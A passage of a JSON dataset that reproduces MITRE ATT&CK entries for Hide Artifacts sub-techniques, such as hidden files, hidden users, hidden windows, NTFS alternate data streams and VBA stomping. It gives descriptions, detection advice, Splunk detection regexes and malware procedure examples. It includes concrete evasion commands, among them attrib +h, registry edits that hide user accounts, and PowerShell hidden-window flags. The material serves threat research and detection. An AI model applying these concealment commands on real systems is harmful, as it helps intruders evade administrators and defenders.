      "ccf32has created a hidden directory on targeted systems, naming it after the current local time (year, month, and day).[18]",
      "Clamblinghas the ability to set its file attributes to hidden.[19]",
      "COATHANGERcreates and installs itself to a hidden installation directory.[20]",
      "CoinTickerdownloads the following hidden files to evade detection and maintain persistence: /private/tmp/.info.enc, /private/tmp/.info.py, /private/tmp/.server.sh, ~/Library/LaunchAgents/.espl.plist, ~/Library/Containers/.[random string]/[random string].[21]",
      "Cuckoo Stealerhas copied its binary and the victim's scraped password into a hidden folder in the/Usersdirectory.[22][23]",
      "Daclshas had its payload named with a dot prefix to make it hidden from view in the Finder application.[24][25]",
      "DarkGateinitial installation involves dropping several files to a hidden directory named after the victim machine name.[26]Additionally,DarkGateusesattribto hide a directory in the following command:C:\\Windows\\system32\\attrib.exe\" +h C:/rjtu/.[10]",
      "EnvyScoutcan use hidden directories and files to hide malicious executables.[27]",
      "Explosivehas commonly set file and path attributes to hidden.[28]",
      "FIN13has created hidden files and folders within a compromised Linux system/tmpdirectory.FIN13also has usedattrib.exeto hide gathered local host information.[29][30]",
      "FruitFlysaves itself with a leading \".\" to make it a hidden file.[31]",
      "HAFNIUMhas hidden files on a compromised host.[32]",
      "iKittensaves itself with a leading \".\" so that it's hidden from users by default.[31]",
      "Imminent Monitorhas a dynamic debugging feature to set the file attribute to hidden.[33]",
      "InvisiMolecan create hidden system directories.[34]",
      "Ixeshesets its own executable file's attributes to hidden.[35]",
      "TheKomplexpayload is stored in a hidden directory at/Users/Shared/.local/kextd.[1]",
      "Lazarus Grouphas used a VBA Macro to set its file attributes to System and Hidden and has named files with a dot prefix to hide them from the Finder application.[36][24][25][37]",
      "Lokibothas the ability to copy itself to a hidden file and directory.[38]",
      "LoudMinerhas set the attributes of the VirtualBox directory and VBoxVmService parent directory to \"hidden\".[39]",
      "LuminousMothhas used malware to store malicious binaries in hidden directories on victim's USB drives.[40]",
      "Machetehas the capability to exfiltrate stolen data to a hidden folder on a removable drive.[41]",
      "MacSpystores itself in~/Library/.DS_Stores/[42]",
      "Micropsiacreates a new hidden directory to store all components' outputs in a dedicated sub-folder for each.[43]",
      "Mustang Panda'sPlugXvariant has created a hidden folder on USB drives namedRECYCLE.BINto store malicious executables and collected data.[44]",
      "NETWIREcan copy itself to and launch itself from hidden folders.[45]",
      "Before exfiltration,Okrum's backdoor has used hidden files to store logs and outputs from backdoor commands.[46]",
      "OSX/Shlayerhas executed a .command script from a hidden directory in a mounted DMG.[47]",
      "OSX_OCEANLOTUS.Dsets the main loader file’s attributes to hidden.[48]",
      "PlugXcan modify the characteristics of folders to hide them from the compromised user.[49]",
      "PoetRAThas the ability to hide and unhide files.[50]",
      "QakBothas placed its payload in hidden subdirectories.[51]",
      "QuasarRAThas the ability to set file attributes to \"hidden\" to hide files from the compromised user's view in Windows File Explorer.[52]",
      "RedCurladded the \"hidden\" file attribute to original files, manipulating victims to click on malicious LNK files.[53][54]",
      "Mustang Pandastored encrypted payloads associated withPlugXinstallation in hidden directories duringRedDelta Modified PlugX Infection Chain Operations.[55]",
      "Rising Suncan modify file attributes to hide files.[56]",
      "Rockedownloaded a file \"libprocesshider\", which could hide files on the target system.[57][58]",
      "SLOTHFULMEDIAhas been created with a hidden attribute to insure it's not visible to the victim.[59]",
      "SysUpdatehas the ability to set file attributes to hidden.[60]",
      "ThiefQuesthides a copy of itself in the user's~/Librarydirectory by using a.at the beginning of the file name followed by 9 random characters.[61]",
      "Transparent Tribecan hide legitimate directories and replace them with malicious copies of the same name.[62]",
      "Tropic Trooperhas created a hidden directory underC:\\ProgramData\\Apple\\Updates\\andC:\\Users\\Public\\Documents\\Flash\\.[63][64]",
      "WannaCryusesattrib+hto make some of its files hidden.[11][12]",
      "WastedLockerhas copied a random file from the Windows System32 folder to the%APPDATA%location under a different hidden filename.[65]",
      "XCSSETuses a hidden folder named.xcassetsand.gitto embed itself in Xcode.[66]"
    ]
  },
  "T1564.002": {
    "Name": "Hide Artifacts:Hidden Users",
    "Description": "Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users.In macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key valueHide500UserstoTRUEin the/Library/Preferences/com.apple.loginwindowplist file.[1]Every user has a userID associated with it. When theHide500Userskey value is set toTRUE, users with a userID under 500 do not appear on the login screen and in System Preferences. Using the command line, adversaries can use thedsclutility to create hidden user accounts by setting theIsHiddenattribute to1. Adversaries can also hide a user’s home folder by changing thechflagsto hidden.[2]Adversaries may similarly hide user accounts in Windows. Adversaries can set theHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserListRegistry key value to0for a specific user to prevent that user from being listed on the logon screen.[3][4]On Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using thegsettingscommand (ex:sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true).[5]Display Managers are not anchored to specific distributions and may be changed by a user or adversary.",
    "Detects": [
      "Monitor executed commands and arguments that could be taken to add a new user and subsequently hide it from login screens.",
      "Monitor for changes made to files that may use hidden users to mask the presence of user accounts they create or modify. Monitor for changes made to the/Library/Preferences/com.apple.loginwindowplist file for unexpected modifications to theHide500Userskey value on macOS.[1]",
      "Monitor newly executed processes for actions that could be taken to add a new user and subsequently hide it from login screens.",
      "Monitor for newly constructed user accounts, such as userIDs under 500 on macOS, that may mask the presence of user accounts they create or modify.",
      "Monitor for contextual data about an account, which may include a username, user ID, environmental data that may mask the presence of user accounts they create or modify. On macOS, identify users with an userID under 500 and theHide500Userskey value in the/Library/Preferences/com.apple.loginwindowplist file set toTRUE.[1]",
      "Monitor for changes made to windows registry key or values for unexpected modifications of theHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserListkey."
    ],
    "Procedure Examples": [
      "Dragonflyhas modified the Registry to hide created user accounts.[4]",
      "Kimsukyhas runreg add ‘HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList’ /vto hide a newly created user.[6]",
      "SMOKEDHAMhas modified the Registry to hide created user accounts from the Windows logon screen.[3]"
    ]
  },
  "T1564.003": {
    "Name": "Hide Artifacts:Hidden Window",
    "Description": "Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks.Adversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.[1]On macOS, the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can beapple.awt.UIElement, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.Similarly, on Windows there are a variety of features in scripting languages, such asPowerShell, Jscript, andVisual Basicto make windows hidden. One example of this ispowershell.exe -WindowStyle Hidden.[2]The Windows Registry can also be edited to hide application windows from the current user. For example, by setting theWindowPositionsubkey in theHKEY_CURRENT_USER\\Console\\%SystemRoot%_System32_WindowsPowerShell_v1.0_PowerShell.exeRegistry key to a maximum value, PowerShell windows will open off screen and be hidden.[3]In addition, Windows supports theCreateDesktop()API that can create a hidden desktop window with its own correspondingexplorer.exeprocess.[4][5]All applications running on the hidden desktop window, such as a hidden VNC (hVNC) session,[4]will be invisible to other desktops windows.",
    "Detects": [
      "Monitor executed commands and arguments that may use hidden windows to conceal malicious activity from the plain sight of users. In Windows, enable and configure event logging and PowerShell logging to check for the hidden window style.",
      "Monitor for changes made to files that may use hidden windows to conceal malicious activity from the plain sight of users. In MacOS, plist files are ASCII text files with a specific format, so they're relatively easy to parse. File monitoring can check for theapple.awt.UIElementor any other suspicious plist tag in plist files and flag them.",
      "Monitor newly executed processes that may use hidden windows to conceal malicious activity from the plain sight of users. For example, monitor suspicious windows explorer execution – such as an additionalexplorer.exeholding a handle to an unknown desktop – that may be used for hidden malicious activity via hVNC.[54]",
      "Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.",
      "Monitor for changes in Registry keys such asHKEY_CURRENT_USER\\Console\\%SystemRoot%_System32_WindowsPowerShell_v1.0_PowerShell.exeandHKEY_CURRENT_USER\\Console\\%SystemRoot%_SysWOW64_WindowsPowerShell_v1.0_PowerShell.exe, especially setting the subkeyWindowPositionto a maximum value or the subkeysScreenBufferSizeandWindowSizeto 1."
    ],
    "Procedure Examples": [
      "Agent Teslahas usedProcessWindowStyle.Hiddento hide windows.[6]",
      "APT19used-W Hiddento concealPowerShellwindows by setting the WindowStyle parameter to hidden.[7]",
      "APT28has used the WindowStyle parameter to concealPowerShellwindows.[8][9]",
      "APT3has been known to use-WindowStyle Hiddento concealPowerShellwindows.[10]",
      "APT32has used the WindowStyle parameter to concealPowerShellwindows.[11][12]",
      "Astarothloads its module with the XSL script parametervShowset to zero, which opens the application with a hidden window.[13]",
      "AsyncRATcan hide the execution of scheduled tasks usingProcessWindowStyle.Hidden.[14]",
      "AvosLockerhas hidden its console window by using theShowWindowAPI function.[15]",
      "BONDUPDATERuses-windowstyle hiddento conceal aPowerShellwindow that downloads a payload.[16]",
      "CopyKittenshas used-w hiddenand-windowstyle hiddento concealPowerShellwindows.[17]",
      "Cubahas executed hidden PowerShell windows.[18]",
      "DarkHydrushas used-WindowStyle Hiddento concealPowerShellwindows.[19]",
      "Deep Pandahas used-w hiddento concealPowerShellwindows by setting the WindowStyle parameter to hidden.[20]",
      "Gamaredon Grouphas usedhidconto run batch files in a hidden console window.[21]",
      "Gorgon Grouphas used-W Hiddento concealPowerShellwindows by setting the WindowStyle parameter to hidden.[22]",
      "HAMMERTOSShas used-WindowStyle hiddento concealPowerShellwindows.[23]",
      "Higaisaused a payload that creates a hidden window.[24]",
      "HotCroissanthas the ability to hide the window for operations performed on a given file.[25]",
      "IMAPLoaderhides the Windows Console window created by its execution by directly importing thekernel32.dllanduser32.dlllibrariesGetConsoleWindowandShowWindowAPIs.[26]",
      "InvisiMolehas executed legitimate tools in hidden windows.[27]",
      "Kevincan hide the current window from the targeted user via theShowWindowAPI function.[28]",
      "KeyBoyuses-w Hiddento conceal aPowerShellwindow that downloads a payload.[29]",
      "Kimsukyhas used an information gathering module that will hide an AV software window from the victim.[30]",
      "Kivarshas the ability to conceal its activity through hiding active windows.[31]",
      "Koadichas used the commandPowershell.exe -ExecutionPolicy Bypass -WindowStyle Hiddento hide its window.[32]",
      "KOCTOPUShas used-WindowsStyle Hiddento hide the command window.[32]",
      "LockBit 2.0can execute command line arguments in a hidden window.[33]",
      "Lumma Stealerhas utilized the .NETProcessStartInfoclass features to prevent the process from creating a visible window through setting theCreateNoWindowsetting to \"True,\" which allows the executed command or script to run without displaying a command prompt window.[34]",
      "Magic Houndmalware has a function to determine whether the C2 server wishes to execute the newly dropped file in a hidden window.[35]",
      "MCMDcan modify processes to prevent them from being visible on the desktop.[36]",
      "Metamorfohas hidden its GUI using the ShowWindow() WINAPI call.[37]",
      "Meteorcan hide its console window upon execution to decrease its visibility to a victim.[38]",
      "Nomadic Octopusexecuted PowerShell in a hidden window.[39]",
      "OilBoostercan hide its console window upon execution through theShowWindowAPI.[40]",
      "PowerShowerhas added a registry key so future powershell.exe instances are spawned with coordinates for a window position off-screen by default.[41]",
      "QuasarRATcan hide process windows and make web requests invisible to the compromised user. Requests marked as invisible have been sent with user-agent stringMozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194AthoughQuasarRATcan only be run on Windows systems.[42]",
      "QUIETCANARYcan execute processes in a hidden window.[43]",
      "QuietSievehas the ability to execute payloads in a hidden window.[44]",
      "SharpDiscocan hide windows usingProcessWindowStyle.Hidden.[45]",
      "SILENTTRINITYhas the ability to set its window state to hidden.[46]",
      "Snip3can execute PowerShell scripts in a hidden window.[47]",
      "StrongPityhas the ability to hide the console window for its document search module from the user.[48]",
      "ToddyCathas hidden malicious scripts usingpowershell.exe -windowstyle hidden.[49]",
      "TrickBot has used a hidden VNC (hVNC) window to monitor the victim and collect information stealthily.[50]",
      "Ursnifdroppers have used COM properties to execute malware in hidden windows.[51]",
      "WarzoneRAT has the ability of performing remote desktop access via a hVNC window for decreased visibility.[52]",
      "WindTailcan instruct the OS to execute an application without a dock icon or menu.[53]"
    ]
  },
  "T1564.004": {
    "Name": "Hide Artifacts:NTFS File Attributes",
    "Description": "Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition.[1]Within MFT entries are file attributes,[2]such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files).[1][3][4][5]Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus.[6][4]",
    "Detects": [
      "The Streams tool of Sysinternals can be used to uncover files with ADSs. Thedir /rcommand can also be used to display ADSs.[26]Many PowerShell commands (such as Get-Item, Set-Item, Remove-Item, and Get-ChildItem) can also accept a-streamparameter to interact with ADSs.[4][5]",
      "Monitor for contextual data about a file, which may include information such as name, the content (ex: signature, headers, or data/media), user/owner, permissions, may use NTFS file attributes to hide their malicious data in order to evade detection. Forensic techniques exist to identify information stored in NTFS EA.[6]",
      "There are many ways to create and interact with ADSs using Windows utilities. Monitor for operations (execution, copies, etc.) with file names that contain colons. This syntax (ex:file.ext:ads[.ext]) is commonly associated with ADSs.[5][27][28]For a more exhaustive list of utilities that can be used to execute and create ADSs, see https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f.",
      "Monitor calls to theZwSetEaFileandZwQueryEaFileWindows API functions as well as binaries used to interact with EA,[27][28]and consider regularly scanning for the presence of modified information.[1]",
      "Monitor for process execution that may use NTFS file attributes to hide their malicious data in order to evade detection.Analytic 1 - NTFS Alternate Data Stream Execution : System Utilities (Powershell)(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") Image= \"C:\\Windows\\\\powershell.exe\" | regex CommandLine= \"Invoke-CimMethod\\s+-ClassName\\s+Win32_Process\\s+-MethodName\\s+Create.\\b(\\w+(.\\w+)?):(\\w+(.\\w+)?)|-ep bypass\\s+-\\s+<.\\b(\\w+(.\\w+)?):(\\w+(.\\w+)?)|-command.Get-Content.-Stream.Set-Content.start-process .(\\w+(.\\w+)?)\"Analytic 2 - NTFS Alternate Data Stream Execution : System Utilities (WMIC)(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") Image= \"C:\\Windows\\\\wmic.exe\" | regex CommandLine= \"process call create.\\\"(\\w+(.\\w+)?):(\\w+(.\\w+)?)\"Analytic 3 - NTFS Alternate Data Stream Execution : System Utilities (rundll32)(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") Image= \"C:\\Windows\\\\rundll32.exe\" | regex CommandLine= \"\\\"?(\\w+(.\\w+)?):(\\w+(.\\w+)?)?\\\"?,\\w+\\|(advpack.dll\\|ieadvpack.dll),RegisterOCX\\s+(\\w+.\\w+):(\\w+(.\\w+)?)\\|(shdocvw.dll\\|ieframe.dll),OpenURL.(\\w+.\\w+):(\\w+(.\\w+)?)\"Analytic 4 - NTFS Alternate Data Stream Execution : System Utilities (wscript/cscript)(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") Image= \"C:\\Windows\\\\wscript.exe\" OR Image= \"C:\\Windows\\\\cscript.exe)\" | regex CommandLine= \"(?<!\\/)\\b\\w+(.\\w+)?:\\w+(.\\w+)?$\""
    ],
    "Procedure Examples": [
      "Anchorhas used NTFS to hide files.[7]",
      "APT32used NTFS alternate data streams to hide their payloads.[8]",
      "Astarothcan abuse alternate data streams (ADS) to store content for malicious payloads.[9]",
      "BitPaymerhas copied itself to the:binalternate data stream of a newly created file.[10]",
      "The DEADEYE.EMBED variant ofDEADEYEcan embed its payload in an alternate data stream of a local file.[11]",
      "esentutlcan be used to read and write alternate data streams.[12]",
      "Expandcan be used to download or copy a file into an alternate data stream.[13]",
      "Gazerstores configuration items in alternate data streams (ADSs) if the Registry is not accessible.[14]",
      "Latrodectuscan delete itself while its process is still running through the use of an alternate data stream.[15]",
      "LoJaxhas loaded an embedded NTFS DXE driver to be able to access and write to NTFS partitions.[16]",
      "PowerDukehides many of its backdoor payloads in an alternate data stream (ADS).[17]",
      "If the victim is using PowerShell 3.0 or later,POWERSOURCEwrites its decoded payload to an alternate data stream (ADS) named kernel32.dll that is saved in%PROGRAMDATA%\\Windows\\.[18]",
      "TheReginmalware platform uses Extended Attributes to store encrypted executables.[19]",
      "Valakhas the ability save and execute files as alternate data streams (ADS).[20][21][22]",
      "WastedLockerhas the ability to save and execute files as an alternate data stream (ADS).[23]",
      "Some variants of theZeroaccessTrojan have been known to store data in Extended Attributes.[24]"
    ]
  },
  "T1564.005": {
    "Name": "Hide Artifacts:Hidden File System",
    "Description": "Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.[1]Adversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions.[1][2]Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system.[3]Adversaries may also fragment files across the existing file system structure in non-standard ways.[4]",
    "Detects": [
      "Detecting the use of a hidden file system may be exceptionally difficult depending on the implementation. Emphasis may be placed on detecting related aspects of the adversary lifecycle, such as how malware interacts with the hidden file system or how a hidden file system is loaded.",
      "Monitor for changes made to firmware for unexpected modifications to settings and/or data that may use a hidden file system to conceal malicious activity from users and security tools.Bootkit",
      "Monitor for changes made to windows registry keys and/or values that may use a hidden file system to conceal malicious activity from users and security tools."
    ],
    "Procedure Examples": [
      "BOOTRASHhas used unallocated disk space between partitions for a hidden file system that stores components of the Nemesis bootkit.[2]",
      "ComRAThas used a portable FAT16 partition image placed in %TEMP% as a hidden file system.[3]",
      "Equationhas used an encrypted virtual file system stored in the Windows Registry.[4]",
      "Reginhas used a hidden file system to store some of its components.[5]",
      "Striderhas used a hidden file system that is stored as a file on disk.[6]",
      "Uroburoscan use concealed storage mechanisms including an NTFS or FAT-16 filesystem encrypted with CAST-128 in CBC mode.[7]"
    ]
  },
  "T1564.006": {
    "Name": "Hide Artifacts:Run Virtual Instance",
    "Description": "Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance.[1]Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.[2]Adversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.[3]In VMWare environments, adversaries may leverage the vCenter console to create new virtual machines. However, they may also create virtual machines directly on ESXi servers by running a valid.vmxfile with the/bin/vmxutility. Adding this command to/etc/rc.local.d/local.sh(i.e.,RC Scripts) will cause the VM to persistently restart.[4]Creating a VM this way prevents it from appearing in the vCenter console or in the output to thevim-cmd vmsvc/getallvmscommand on the ESXi server, thereby hiding it from typical administrative activities.[5]",
    "Detects": [
      "Consider monitoring for commands and arguments that may be atypical for benign use of virtualization software. Usage of virtualization binaries or command-line arguments associated with running a silent installation may be especially suspect (ex.-silent,-ignore-reboot), as well as those associated with running a headless (in the background with no UI) virtual instance (ex.VBoxManage startvm $VM --type headless).[8]Similarly, monitoring command line arguments which suppress notifications may highlight potentially malicious activity (ex.VBoxManage.exe setextradata global GUI/SuppressMessages \"all\"). Monitor for commands which enable hypervisors such as Hyper-V. On ESXi servers, monitor for unsusual use of the/bin/vmxutility.",
      "Monitor for newly constructed files associated with running a virtual instance, such as binary files associated with common virtualization technologies (ex: VirtualBox, VMware, QEMU, Hyper-V). On ESXi servers, this includes new.vmxfiles in the/vmfs/volumes/directory.",
      "Consider monitoring the size of virtual machines running on the system. Adversaries may create virtual images which are smaller than those of typical virtual machines.[8]Network adapter information may also be helpful in detecting the use of virtual instances.",
      "Monitor newly executed processes associated with running a virtual instance, such as those launched from binary files associated with common virtualization technologies (ex: VirtualBox, VMware, QEMU, Hyper-V).",
      "Monitor for newly constructed services/daemons that may carry out malicious operations using a virtual instance to avoid detection. Consider monitoring for newWindows Service, with respect to virtualization software.",
      "Monitor for changes made to Windows Registry keys and/or values that may be the result of using a virtual instance to avoid detection. For example, if virtualization software is installed by the adversary the Registry may provide detection opportunities."
    ],
    "Procedure Examples": [
      "LoudMinerhas used QEMU and VirtualBox to run a Tiny Core Linux virtual machine, which runs XMRig and makes connections to the C2 server for updates.[6]",
      "Mazeoperators have used VirtualBox and a Windows 7 virtual machine to run the ransomware; the virtual machine's configuration file mapped the shared network drives of the target company, presumably soMazecan encrypt files on the shared drives as well as the local machine.[7]",
      "Ragnar Lockerhas used VirtualBox and a stripped Windows XP virtual machine to run itself. The use of a shared folder specified in the configuration enablesRagnar Lockerto encrypt files on the host operating system, including files on any mapped drives.[3]"
    ]
  },
  "T1564.007": {
    "Name": "Hide Artifacts:VBA Stomping",
    "Description": "Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.[1]MS Office documents with embedded VBA content store source code inside of module streams. Each module stream has aPerformanceCachethat stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the_VBA_PROJECTstream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application.[2][3]An adversary may hide malicious VBA code by overwriting the VBA source code location with zero’s, benign code, or random bytes while leaving the previously compiled malicious p-code. Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code. If the VBA source code is removed, some tools might even think that there are no macros present. If there is a version match between the_VBA_PROJECTstream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.[4][1][5]",
    "Detects": [
      "If the document is opened with a Graphical User Interface (GUI) the malicious p-code is decompiled and may be viewed. However, if thePROJECTstream, which specifies the project properties, is modified in a specific way the decompiled VBA code will not be displayed. For example, adding a module name that is undefined to thePROJECTstream will inhibit attempts of reading the VBA source code through the GUI.[1]",
      "Detection efforts should be placed finding differences between VBA source code and p-code.[4]VBA code can be extracted from p-code before execution with tools such as the pcodedmp disassembler. The oletools toolkit leverages the pcodedmp disassembler to detect VBA stomping by comparing keywords present in the VBA source code and p-code.[5][7]"
    ],
    "Procedure Examples": [
      "Turn off or restrict access to unneeded VB components.[6]"
    ]
  },
  "T1564.008": {
    "Name": "Hide Artifacts:Email Hiding Rules",
    "Description": "Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as theNew-InboxRuleorSet-InboxRulePowerShellcmdlets on Windows systems.[1][2][3][4]Adversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses toInternal Spearphishingemails sent from the compromised account.Any user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such asmalware,suspicious,phish, andhack) found in message bodies and subject lines.[5]In some environments, administrators may be able to enable email rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.[6]Adversaries that abuse such features may be able to automatically modify or delete all emails related to specific topics (such as internal security incident notifications).",
    "Detects": [
      "Monitor for third-party application logging, messaging, and/or other artifacts that may use email rules to hide inbound emails in a compromised user's mailbox. Monitor email clients and applications for suspicious activity, such as missing messages or abnormal configuration and/or log entries. In environments using Exchange, monitor logs for the creation or modification of mail transport rules.",
      "On Windows and Exchange systems, monitor for creation or modification of suspicious inbox rules through the use of theNew-InboxRule,Set-InboxRule,New-TransportRule, andSet-TransportRulePowerShell cmdlets.[11][10][12]",
      "On MacOS systems, monitor for modifications to theRulesActiveState.plist,SyncedRules.plist,UnsyncedRules.plist, andMessageRules.plistfiles.[2]"
    ],
    "Procedure Examples": [
      "FIN4has created rules in victims' Microsoft Outlook accounts to automatically delete emails containing words such as \"hacked,\" \"phish,\" and \"malware\" in a likely attempt to prevent organizations from communicating about their activities.[7]",
      "Scattered Spidercreates inbound rules on the compromised email accounts of security personnel to automatically delete emails from vendor security products.[8]"
    ]
  },
  "T1564.009": {
    "Name": "Hide Artifacts:Resource Forking",
    "Description": "Adversaries may abuse resource forks to hide malicious code or executables to evade detection and bypass security applications. A resource fork provides applications a structured way to store resources such as thumbnail images, menu definitions, icons, dialog boxes, and code.[1]Usage of a resource fork is identifiable when displaying a file’s extended attributes, usingls -l@orxattr -lcommands. Resource forks have been deprecated and replaced with the application bundle structure. Non-localized resources are placed at the top level directory of an application bundle, while localized resources are placed in the/Resourcesfolder.[2][3]Adversaries can use resource forks to hide malicious data that may otherwise be stored directly in files. Adversaries can execute content with an attached resource fork, at a specified offset, that is moved to an executable location then invoked. Resource fork content may also be obfuscated/encrypted until execution.[4][5]",
    "Detects": [
      "Monitor executed commands and arguments that are leveraging the use of resource forks, especially those immediately followed by potentially malicious activity such as creating network connections.",
      "Monitor for newly constructed files that may abuse resource forks to hide malicious code or executables to evade detection and bypass security applications.",
      "Identify files with thecom.apple.ResourceForkextended attribute and large data amounts stored in resource forks.",
      "Monitor newly executed processes that may abuse resource forks to hide malicious code or executables to evade detection and bypass security applications."
    ],
    "Procedure Examples": [
      "Keydnapuses a resource fork to present a macOS JPEG or text file icon rather than the executable's icon assigned by the operating system.[6]",
      "OSX/Shlayerhas used a resource fork to hide a compressed binary file of itself from the terminal, Finder, and potentially evade traditional scanners.[5][4]"
    ]
  },
  "T1564.010": {
    "Name": "Hide Artifacts:Process Argument Spoofing",
    "Description": "Adversaries may attempt to hide process command-line arguments by overwriting process memory. Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process. The PEB includes the process command-line arguments that are referenced when executing the process. When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB.[1][2]Adversaries may manipulate a process PEB to evade defenses. For example,Process Hollowingcan be abused to spawn a process in a suspended state with benign arguments. After the process is spawned and the PEB is initialized (and process information is potentially logged by tools/sensors), adversaries may override the PEB to modify the command-line arguments (ex: using theNative APIWriteProcessMemory()function) then resume process execution with malicious arguments.[3][2][4]Adversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis.[5]This behavior may also be combined with other tricks (such asParent PID Spoofing) to manipulate or further evade process-based detections.",
    "Detects": [
      "Analyze process behavior to determine if a process is performing actions it usually does not and/or do no align with its logged command-line arguments.Detection of process argument spoofing may be difficult as adversaries may momentarily modify stored arguments used for malicious execution. These changes may bypass process creation detection and/or later process memory analysis. Consider monitoring forProcess Hollowing, which includes monitoring for process creation (especially those in a suspended state) as well as access and/or modifications of these processes (especially by the parent process) via Windows API calls.[4][7]"
    ],
    "Procedure Examples": [
      "Cobalt Strikecan use spoof arguments in spawned processes that execute beacon commands.[6]",
      "SombRAThas the ability to modify its process memory to hide process command-line arguments.[5]"
    ]
  },
  "T1564.011": {
    "Name": "Hide Artifacts:Ignore Process Interrupts",
    "Description": "Adversaries may evade defensive mechanisms by executing commands that hide from process interrupt signals. Many operating systems use signals to deliver messages to control process behavior. Command interpreters often include specific commands/flags that ignore errors and other hangups, such as when the user of the active session logs off.[1]These interrupt signals may also be used by defensive tools and/or analysts to pause or terminate specified running processes.Adversaries may invoke processes usingnohup,PowerShell-ErrorAction SilentlyContinue, or similar commands that may be immune to hangups.[2][3]This may enable malicious commands and malware to continue execution through system events that would otherwise terminate its execution, such as users logging off or the termination of its C2 network connection.Hiding from process interrupt signals may allow malware to continue execution, but unlikeTrapthis does not establishPersistencesince the process will not be re-invoked once actually terminated.",
    "Detects": [
      "Monitor executed commands and arguments, such asnohup, that may attempt to hide processes from interrupt signals.",
      "Monitor newly created processes for artifacts, such asnohuporPowerShell-ErrorAction SilentlyContinue, that may attempt to hide processes from interrupt signals."
    ],
    "Procedure Examples": [
      "BOLDMOVEcalls the signal function to ignore the signals SIGCHLD, SIGHIP, and SIGPIPE prior to starting primary logic.[4]",
